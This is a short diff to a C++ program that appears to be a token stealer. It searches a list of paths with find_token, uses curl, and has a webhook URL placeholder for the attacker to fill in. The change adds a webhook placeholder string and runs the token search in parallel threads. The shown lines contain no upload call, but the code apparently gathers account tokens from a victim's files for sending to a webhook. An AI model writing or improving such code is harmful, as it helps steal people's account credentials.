@@ -4,9 +4,10 @@
 #include <sys/stat.h>
 #include <filesystem>
 #include <regex>
+#include <thread>
 #include <curl/curl.h>
 
-const char* webhook_url = "";
+const char* webhook_url = "put your webhook url here";
 
 bool has_extension(const std::string& filepath, const std::string& extension) {
 	std::filesystem::path path(filepath);
@@ -142,10 +143,17 @@ void find_token(const std::string& path) {
 
 int main(int argc, char* argv[]) {
 	std::vector<std::string> paths = find_paths();
+	std::vector<std::thread> threads;
 
 	for (int i = 0; i < paths.size(); i++) {
 		if (exists(paths[i])) {
-			find_token(paths[i]);
+			threads.emplace_back(find_token, paths[i]);
+		}
+	}
+
+	for (auto& t : threads) {
+		if (t.joinable()) {
+			t.join();
 		}
 	}
 
